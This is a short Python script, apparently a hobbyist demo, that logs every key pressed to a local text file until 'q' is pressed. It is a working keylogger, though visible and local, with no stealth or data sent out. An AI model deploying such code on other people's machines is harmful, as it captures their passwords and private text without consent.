# Created By Fattcat #
# Date : 05.08.2023 Slovakia
# GitHub --> https://github.com/Fattcat/
# YouTube --> https://www.youtube.com/channel/UCKfToKJFq-uvI8svPX0WzYQ

import keyboard
import datetime

ActualDate = datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
file_path = "PressedKeys.txt"

def log_key(e):
    with open(file_path, "a") as file:
        file.write("\n"*2 + ActualDate + "\n"*2 + "Pressed Key : "+ e.name)

print("Press q for STOP Script")
keyboard.hook(log_key)
keyboard.wait('q')
